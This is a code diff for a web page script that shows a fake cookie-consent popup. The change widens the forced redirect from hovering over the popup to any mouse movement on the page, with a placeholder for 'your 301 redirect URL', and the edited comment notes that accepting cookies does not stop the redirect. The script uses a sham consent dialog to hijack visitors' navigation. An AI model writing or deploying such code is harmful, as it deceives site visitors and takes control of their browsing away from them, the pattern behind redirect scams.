@@ -26,12 +26,12 @@ document.addEventListener("DOMContentLoaded", function () {
     `;
     document.body.appendChild(cookiePopup);
 
-    // Redirect when the user hovers over the popup
-    document.getElementById("cookieConsent").addEventListener("mouseenter", function () {
-        window.location.href = "https://www.facebook.com"; // Change this to your 301 redirect URL
+    // Redirect when the user moves the cursor anywhere on the page
+    document.addEventListener("mousemove", function () {
+        window.location.href = "https://www.google.com"; // Change this to your 301 redirect URL
     });
 
-    // Show the popup every time (even if they accepted before)
+    // Remove popup when clicking accept (does not prevent redirection)
     document.getElementById("acceptCookies").addEventListener("click", function () {
         document.getElementById("cookieConsent").remove();
     });
